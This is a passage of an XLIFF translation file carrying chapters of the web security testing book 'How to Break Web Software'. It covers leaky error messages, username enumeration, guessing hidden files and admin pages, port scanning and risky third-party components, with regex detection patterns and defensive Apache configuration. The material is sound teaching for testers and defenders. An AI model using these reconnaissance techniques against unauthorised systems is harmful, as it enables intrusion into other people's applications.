          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>INSERT\sINTO\s[\d\w]+[\s\w\d\)\(\,]*\sVALUES\s\([\d\w\'\,\)]+</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>DELETE\sFROM\s[\d\w\'\=]+</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Database connection strings</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>A basic pattern to look for common keywords in database connection strings. Can cause lots of false-positives because of the variability in different languages and databases.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Provider|Data\sSource|Driver</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Hidden input fields</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Hidden input fields are discussed in &lt;a class="docLink" href="ch04lev1sec2.html#ch04lev2sec1"&gt;attack 6&lt;/a&gt;. Identifying their location in this attack can save lots of time.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>&amp;lt;input\s[\w\W]*?type=(&amp;quot;)?hidden(&amp;quot;)?[\w\W]*?&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>After you've combed the source manually and automatically, the next place to turn is to the parameters that are passed between pages. These parameters are useful to force the application into generating error messages. By modifying the parameters to values outside their normal value ranges or data types, we can uncover interesting design details and error pages that have information helpful to an attacker&amp;mdash;the last people in the world we want to create an advantage for!</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>For example, consider the screen shot shown in &lt;a class="docLink" href="#ch02fig03"&gt;Figure 2-3&lt;/a&gt;. When there was an error in connecting to the database and the ColdFusion script didn't handle it, the error page echoed not only what the problem was, but also the code surrounding where the error occurred. Usually, the server would process the &lt;tt&gt;&amp;lt;cfinsert&amp;gt;&lt;/tt&gt; tag, but showing the tag here gives valuable information to the attacker&amp;mdash;a table name in the database, and the name of the database. An attacker could use this information because databases often contain information that an adversary would covet.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 2-3. Information disclosure in an errant database connection.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This information can be used in SQL injection attacks, described in &lt;a class="docLink" href="ch05.html#ch05"&gt;Chapters 5&lt;/a&gt;, &amp;quot;Attacking User-Supplied Input Data&amp;quot; and &lt;a class="docLink" href="ch07.html#ch07"&gt;7&lt;/a&gt;, &amp;quot;Attacking the Server.&amp;quot;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In some environments, such as ColdFusion or Java Servlets, managing to crash the application by forcing a language syntax error or unhandled exception causes the server to respond with a trace of the functions called and may include a code snippet for where the error occurred. Be careful to force as many error messages as possible and read every word of dialogue that the server returns. Whether those error messages come from the application or from the Web server, they are often a source of useful information for an attacker.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The classic case of an overly helpful error message is the logon screen example. Consider a logon screen that asks for a username and password. If the application returns one error message for an incorrect username and another message for an incorrect password, we've given our attacker the feedback that he has guessed a valid username.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>&lt;a class="docLink" href="#ch02fig04"&gt;Figure 2-4&lt;/a&gt; shows an attempt to log in with an invalid username, and &lt;a class="docLink" href="#ch02fig05"&gt;Figure 2-5&lt;/a&gt; shows an invalid password. Viewing these two error messages together shows the difference. Would you notice they were different if you viewed them one at a time?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 2-4. Error message when invalid username is supplied.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 2-5. Error message when incorrect password is supplied.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The danger is that the attacker now knows that he has stumbled across a legitimate username. Now he's at an advantage trying to guess or crack the password.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Protect Against This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Developing secure Web applications is not just about how the code treats inputs, but also how it treats the contents of outputs. As developers, we must be diligent to walk the fine line between helpful information and dangerous information. Review any comments contained in the source code</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>(either the application code or the HTML) to determine the trade-off between usability and understandability (which is important for users and developers) and information disclosure (which can be useful to attackers). It is a good practice to scrub comments from production code, keeping them only in copies that are stored on internal developer-only servers.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The same is true for error messages, whether they are raised by the Web server, platform (PHP, ColdFusion, ASP.NET, and so on), or the Web application itself. We want to avoid &amp;quot;leaking&amp;quot; information as much as possible. Messages that give feedback to a user should be meaningful but also succinct. For example, any incorrect login information should result in the message &amp;quot;The username and/or password you have provided is incorrect.&amp;quot; With this message, the user knows what's wrong, but an attacker cannot glean whether he has a correct username or password.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Other error messages can give too much detail. What we are not trying to prescribe here is a cryptic error message like &amp;quot;error 58,&amp;quot; but messages that clearly define the problem without giving away too much information. For example, if an error with a SQL query has occurred, by all means tell the user, but don't echo the actual query back to him. He doesn't need to know that information.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Always remember that just because someone's using your Web site, that person isn't necessarily your friend. Malicious users abound.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Don't throw away all your verbose messages, though. Instead, save them to a server-side log file. They may be useful for debugging nasty runtime issues. Developers often need to know the actual SQL query to locate the problem's cause rather than attempting to re-create the symptoms. Also, scanning through such a log file once in a while shows you where users are getting confused by the application (perhaps you may want to go back and address that) and what types of attacks are being attempted against your site.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>Attack 2 Guessing Files and Directories</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>At the simplest level, Web pages are files on a Web server that anyone with a browser can access. Files are generally stored in default locations (for example, C:\Inetpub) and follow naming conventions that make their location and filename predictable. This means that even if there isn't a specific link to a file, if an attacker can predict its name and location, he can browse to it by typing its absolute address and filename into his browser's address bar.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>A famous example of how such a seemingly innocuous thing can cause damage is the case of Reuters publishing a company's third-quarter earnings before those earnings had been officially released.&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch02fn05"&gt;[5]&lt;/a&gt;&lt;/sup&gt; Intentia, a Swedish software company, had its third-quarter earnings document on its Web site, but no link had been posted. It was presumably ready for a link to be posted at the relevant time. However, an industrious reporter guessed the file's location and name based on the location and name of the previous quarter's results, and sure enough, the file was there.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch02fn05"&gt;[5]&lt;/a&gt;&lt;/sup&gt; See &lt;a class="docLink" target="_blank" href="http://news.com.com/2100-1023-963658.html"&gt;http://news.com.com/2100-1023-963658.html&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>It isn't just documents that can be attacked by this strategy. Increasingly, Web servers and the applications that run on them have remotely accessible control and configuration pages. If these pages can be discovered and they are not otherwise protected (or they're weakly protected&amp;mdash;see &amp;quot;&lt;a class="docLink" href="ch07lev1sec2.html#ch07lev2sec4"&gt;Attack 20&lt;/a&gt;&amp;mdash;Breaking Authentication&amp;quot; in &lt;a class="docLink" href="ch08.html#ch08"&gt;Chapter 8&lt;/a&gt;, &amp;quot;Authentication&amp;quot;), the attacker can gain control of the target system.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>When to Apply This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>After a site map (see the previous attack) of the target system has been created, it's easier to see patterns in the page-naming conventions or obvious &amp;quot;apparently&amp;quot; missing sections. Therefore, it makes sense to perform this attack after navigating through (and documenting) the various pages and contents of the target Web site.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Conduct This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>It's difficult to prescribe a way to look for patterns, but with practice, you can become good at spotting them. The most obvious example is when documents that are uploaded to the application are issued sequential numbers. Incrementing or decrementing the number in sequence from a successful document request may allow access to other documents that should be restricted.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Depending on the application, this may or may not be a problem. Simply using this trick to view product descriptions in an e-commerce application doesn't put the attacker at an advantage. The attacker may have circumvented the desired navigation, but it's information that any user would have been able to access anyway.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>However, perhaps the application in question is an online banking application. Maybe the attacker noticed an account number and could modify that parameter to access a different account. That would obviously be problematic. If you discover a pattern, iDefence's session ID auditor (an old brute-force tool that is no longer available but is included on the book's CD) allows you to specify a search format. The tool exhaustively explores all possibilities, stopping when it receives a page hit and informing you that it accessed a page that it should not have had access to.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This attack applies to any files on the Web server. If a common naming convention is used, you can request the file directly and potentially bypass any access control that the application may enforce. (&lt;a class="docLink" href="#ch02fig06"&gt;Figure 2-6&lt;/a&gt;&amp;mdash;this is an old brute-force tool that is no longer available, but is included on the book's CD.)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 2-6. iDefence Session ID Auditor.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Control pages can be hidden in two ways. First, they can be a separate sub-site of the application, as in the /admin/ section on the flower shop in &lt;a class="docLink" href="#ch02fig07"&gt;Figure 2-7&lt;/a&gt;. Second, they can be running on a different port than the standard port 80 of the main Web server, shown on 8100 as the ColdFusion example in &lt;a class="docLink" href="#ch02fig08"&gt;Figure 2-8&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 2-7. Administrative page on hidden directory.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 2-8. Administrative page running on a different port.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Finding sub-sites of an application is like playing a guessing game, but educated guesses can narrow the number of guesses required. Names like admin, control, and cp (Control Panel) are good ones to try. However, completely covering all possibilities, including random site names, is not feasible. Stick to the common names that an attacker might be able to guess.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>When control pages are run on different ports, it's easier to exhaustively cover all possibilities because there's a limited number of ports, and some will already have been taken by other applications. Generally, these application-specific ports are assigned a number greater than 1024.&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch02fn06"&gt;[6]&lt;/a&gt;&lt;/sup&gt; By using a port scanner to map which ports are open and then connecting to those ports, an admin or Control Panel may be discovered.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch02fn06"&gt;[6]&lt;/a&gt;&lt;/sup&gt; Ports below 1024 are &amp;quot;privileged&amp;quot; ports whose use is determined by the operating system. Ports below 1024 can be used for other purposes, but this practice can carry serious repercussions.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 2-9. Finding administrative interfaces through port scanning.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Protect Against This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The moral of this attack is not to rely on security through obscurity. Making information available without any other protection other than it being difficult to guess is asking for trouble. The first method to stop attackers from gaining direct access to files is to configure the Web server so that it won't serve pages other than those of the application. For example, it will allow &lt;a name="iddle1419"&gt;&lt;/a&gt;requests for PHP pages but deny requests for any other files. The snippet that follows from an Apache configuration file does just that:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>&amp;lt;FilesMatch "!\.(php|php3|php4)$"&amp;gt;
Order allow,deny
Deny from all
&amp;lt;/FilesMatch&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This code forces all requests to go through the application where authorization checking can be performed (although there is still the potential for URL jumping attacks&amp;mdash;see &amp;quot;&lt;a class="docLink" href="ch04lev1sec2.html#ch04lev2sec3"&gt;Attack 8&amp;mdash;Cookie Poisoning&lt;/a&gt;,&amp;quot; in &lt;a class="docLink" href="ch04.html#ch04"&gt;Chapter 4&lt;/a&gt;).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Another way to restrict access to administrative pages, or sections of a site that should be out-of-bounds to normal users, is to password-protect entry to those sections. You can achieve this in various ways (basic, digest, and forms-based authentication). Each method has its own potential vulnerabilities (see &amp;quot;&lt;a class="docLink" href="ch07lev1sec2.html#ch07lev2sec4"&gt;Attack 20&lt;/a&gt;&amp;mdash;Breaking Authentication&amp;quot; in &lt;a class="docLink" href="ch08.html#ch08"&gt;Chapter 8&lt;/a&gt;) but they offer an additional level of security. On an Apache server, you can create a .htaccess file containing the following text in the directory you want to protect:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>AuthName "admin pages"
AuthType Basic
AuthUserFile /path/to/.htpasswd
Require valid-user</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Then you need to create a password file by running the htpasswd program. Store this file somewhere that the Web server can access it, but usually not with the other Web documents. You don't want someone to download it and analyze it offline.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source># htpasswd -cm .htpasswd username</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Whenever a user requests a file within the directory where the .htaccess file is located, the browser pops up a message box asking for a username and password to validate the user before access is allowed.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>A similar mechanism is possible under Internet Information Server using Windows built-in user accounts and file/directory level permissions.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>You also can configure the Web server to serve files only to specific network addresses, or use a firewall to block access to ports except from the internal network limiting the range potential attacks can originate from to (hopefully) trusted sources.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>Attack 3 Holes Left by Other People&amp;mdash;Vulnerabilities in Sample Applications</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Web application programming is one of the true &amp;quot;rapid development&amp;quot; environments. The development time of Web applications is usually significantly shorter than their traditional counterparts, mostly because of the ease of programming and abundant libraries of prewritten code available for reuse.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>It's precisely these libraries that this attack focuses on. You may be confident in the quality of your own code, but how about the quality of the supporting code it relies on? The bottom line is that you need to be careful with reusing libraries and sample applications in your own solutions.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>It used to be common for default installs of Web servers to include sample applications or &amp;quot;helper&amp;quot; scripts and documentation, but because of past problems,&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch02fn07"&gt;[7]&lt;/a&gt;&lt;/sup&gt; that practice is avoided.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch02fn07"&gt;[7]&lt;/a&gt;&lt;/sup&gt; See &lt;a class="docLink" target="_blank" href="http://news.com.com/ColdFusion+still+shows+security+holes/2100-1001_3-225235.html"&gt;http://news.com.com/ColdFusion+still+shows+security+holes/2100-1001_3-225235.html&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>However, there's no point in reinventing the wheel, so it remains common to reuse existing components where possible. Numerous sites, including &lt;a class="docLink" target="_blank" href="http://cfexchange.com"&gt;cfexchange.com&lt;/a&gt;, &lt;a class="docLink" target="_blank" href="http://gotdotnet.com"&gt;gotdotnet.com&lt;/a&gt;, and &lt;a class="docLink" target="_blank" href="http://px.sklar.com"&gt;px.sklar.com&lt;/a&gt;, have sprung up where people exchange code. The question you need to ask yourself is how much you trust other people's code.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>When to Apply This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>There are two places where you should use this attack: when the Web server is installed, and at the tail end of the development process.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The install time of the Web server and application environment (that is, the application server such as .NET, PHP, or Java, not the application code) is a crucial moment. What we are looking for at this point is the extra functionality or features that have been installed. We need to know what code is being installed on our Web server and to ensure that we are not inheriting the vulnerabilities that code may possess.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>A Web server faces public, untrusted interfaces. It's important to know what software is sitting on those interfaces waiting to be used or abused.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Another crucial time is at the end of the development process, just as the server is going to go live. We need to audit the application for the shared/third-party components it uses and ensure that those components are not easily hijacked.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Conduct This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The method of attacking a Web application is much the same as the method of defense in this case. Hackers subscribe to vulnerability mailing lists and newsgroups watching for publications of bugs in common components. Often a full-disclosure group gives precise details of what the problem is &lt;span class="docEmphasis"&gt;and&lt;/span&gt; how to attack it (often with step-by-step instructions or a prewritten exploit). Even without this information, as soon as a vulnerability is announced in a well-used component, it comes under heavy scrutiny and testing. It's only a matter of time before details of an exploit are published. Add to this that underground communication used by hackers is more efficient than mainstream information-sharing networks such as CERT, and it becomes a race against time.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>There's no point in discussing various methods of attack against common components in this section, because the techniques used are often the same ones described in this and the previous books in this series. The issue becomes knowing the risks of using code you did not write: checking its pedigree, keeping an eye on what others are saying about it, and proceeding with caution.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Identify any third-party components used in your application, go to the home page for the component in question, and search other sources to find out its pedigree. Has the component been updated frequently? Is it prone to certain types of attack? Has it had major security concerns in the past? All this information about the component should give you enough background to make an informed decision about whether to use and trust it.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>With shared or third-party components, you have to be even more careful about the data being passed to and from them, because you don't know the assumptions and error checking that are going on internally. Our advice in using &lt;span class="docEmphasis"&gt;any&lt;/span&gt; component that you haven't written is to be especially paranoid in input checking and output validation. Ensure that only good data is passed to components from your own code, and check what has been returned from that component with vigor. Use some of the attacks mentioned in the rest of this book to test how shared components react under attack.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>When you can't tell what is installed on the server, Nikto&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch02fn08"&gt;[8]&lt;/a&gt;&lt;/sup&gt; is an open-source tool that performs a wide range of tests to find known vulnerabilities. Beware of the potentially large number of false positive results it may find because of custom error pages or other server configuration issues.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch02fn08"&gt;[8]&lt;/a&gt;&lt;/sup&gt; See &lt;a class="docLink" target="_blank" href="http://www.cirt.net/code/nikto.shtml"&gt;http://www.cirt.net/code/nikto.shtml&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The Web server application is obviously a target for attack, but this topic will have to wait until &amp;quot;&lt;a class="docLink" href="ch07lev1sec2.html#ch07lev2sec3"&gt;Attack 19&amp;mdash;Fingerprinting the Server&lt;/a&gt;&amp;quot; (refer to &lt;a class="docLink" href="ch07.html#ch07"&gt;Chapter 7&lt;/a&gt;, &amp;quot;Attacking the Server&amp;quot;) is discussed.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Protect Against This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>One method of protecting against this attack is to ensure that you install a bare-bones Web server (and host operating system) and never use shared/third-party components. This isn't always an option if you are in a shared hosting environment, and it depends on the skills of your developers, your time, or your budget constraints. (It's often cheaper to purchase or use a prewritten solution than to write one yourself.)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>It's important to search for known issues in any components, including the Web server and its installed components. Also, stay informed via mailing lists and newsgroups, and always follow best practices in locking down servers using tools such as IISLockdown.&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch02fn09"&gt;[9]&lt;/a&gt;&lt;/sup&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch02fn09"&gt;[9]&lt;/a&gt;&lt;/sup&gt; See &lt;a class="docLink" target="_blank" href="http://www.microsoft.com/technet/security/tools/locktool.mspx"&gt;http://www.microsoft.com/technet/security/tools/locktool.mspx&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch02lev1sec1.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch03.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Chapter 3. Attacking the Client</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch02lev1sec2.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Chapter 3. Attacking the Client</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch02lev1sec2.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
